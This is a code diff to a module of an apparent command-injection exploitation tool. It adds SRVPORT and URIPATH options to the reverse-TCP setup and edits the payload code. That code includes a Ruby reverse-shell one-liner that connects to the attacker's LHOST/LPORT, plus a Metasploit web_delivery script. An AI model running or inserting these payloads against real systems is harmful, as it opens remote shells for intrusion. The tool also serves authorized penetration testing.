@@ -43,6 +43,10 @@ def shell_options(option):
       print settings.print_error_msg(err_msg)  
     if option[4:9].lower() == "lport":
       check_lport(option[10:])
+    if option[4:11].lower() == "srvport":
+      check_srvport(option[12:])
+    if option[4:11].lower() == "uripath":
+      check_uripath(option[12:])
   else:
     return option
 
@@ -158,6 +162,27 @@ def check_lport(lport):
     print settings.print_error_msg(err_msg)
     return False
 
+"""
+check / set srvport option for reverse TCP connection
+"""
+def check_srvport(srvport):
+  try:  
+    if float(srvport):
+      settings.SRVPORT = srvport
+      print "SRVPORT => " + settings.SRVPORT
+      return True
+  except ValueError:
+    err_msg = "The provided port must be numeric (i.e. 1234)"
+    print settings.print_error_msg(err_msg)
+    return False
+
+"""
+check / set uripath option for reverse TCP connection
+"""
+def check_uripath(uripath):
+  settings.URIPATH = uripath
+  print "URIPATH => " + settings.URIPATH
+  return True
 
 """
 Set up the netcat reverse TCP connection
@@ -245,7 +270,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
 
     # Ruby-reverse-shell
     elif other_shell == '3':
-      other_shell = "ruby -rsocket -e 'exit if fork;" \
+      other_shell = "ruby -rsocket -e '" \
                     "c=TCPSocket.new(\"" + settings.LHOST + "\"," + settings.LPORT + ");" \
                     "$stdin.reopen(c);" \
                     "$stdout.reopen(c);" \
@@ -354,7 +379,8 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
       except:
         print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
       break
-
+    
+    # Powershell injection attacks
     elif other_shell == '7':
       if not settings.TARGET_OS == "win":
         windows_only_attack_vector()
@@ -438,7 +464,8 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
               print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
             break
       break
-
+    
+    # Web delivery script
     elif other_shell == '8':
       while True:
         web_delivery = raw_input("""
@@ -475,6 +502,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + ""
                             "set target " + str(int(web_delivery)-1) + "\n"
                             "set payload " + payload + "\n"
                             "set lhost " + str(settings.LHOST) + "\n"
+                            "set lport " + str(settings.LPORT) + "\n"
                             "set srvport " + str(settings.SRVPORT) + "\n"
                             "set uripath " + settings.URIPATH + "\n"
                             "exploit\n\n")
@@ -590,27 +618,31 @@ def configure_reverse_tcp():
     elif len(settings.LPORT) != 0 and len(settings.LHOST) != 0:
       break 
     elif option[0:3].lower() == "set":
-        if option[4:9].lower() == "lhost":
-          if check_lhost(option[10:]):
-            if len(settings.LPORT) == 0:
-              pass
-            else:
-              break
+      if option[4:9].lower() == "lhost":
+        if check_lhost(option[10:]):
+          if len(settings.LPORT) == 0:
+            pass
           else:
-            continue
-        if option[4:9].lower() == "rhost":
-          err_msg =  "The '" + option[4:9].upper() + "' option, is not "
-          err_msg += "usable for 'reverse_tcp' mode. Use 'LHOST' option."
-          print settings.print_error_msg(err_msg)  
-          continue  
-        if option[4:9].lower() == "lport":
-          if check_lport(option[10:]):
-            if len(settings.LHOST) == 0:
-              pass
-            else:
-              break
+            break
+        else:
+          continue
+      if option[4:9].lower() == "rhost":
+        err_msg =  "The '" + option[4:9].upper() + "' option, is not "
+        err_msg += "usable for 'reverse_tcp' mode. Use 'LHOST' option."
+        print settings.print_error_msg(err_msg)  
+        continue  
+      if option[4:9].lower() == "lport":
+        if check_lport(option[10:]):
+          if len(settings.LHOST) == 0:
+            pass
           else:
-            continue
+            break
+        else:
+          continue
+      if option[4:11].lower() == "srvport":
+        check_srvport(option[12:])
+      if option[4:11].lower() == "uripath":
+        check_uripath(option[12:])
     else:
       err_msg = "The '" + option + "' option, is not valid."
       print settings.print_error_msg(err_msg)
